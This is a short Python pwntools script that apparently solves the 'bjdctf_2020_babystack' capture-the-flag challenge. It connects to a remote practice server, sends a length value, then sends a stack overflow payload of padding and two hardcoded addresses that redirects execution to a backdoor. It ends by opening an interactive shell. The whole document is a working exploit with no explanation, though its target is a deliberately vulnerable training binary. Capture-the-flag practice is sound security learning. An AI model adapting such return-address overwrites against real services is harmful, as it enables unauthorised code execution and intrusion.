from pwn import *

#r=process('./bjdctf_2020_babystack')
r= remote("node5.buuoj.cn",27632)
context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]
#gdb.attach(r)

r.sendlineafter(b'name:\n',b'120')

payload=b'b'*(0x10+8)+p64(0x0400561)+p64(0x4006E6)
r.sendlineafter(b'name?\n',payload)
r.interactive()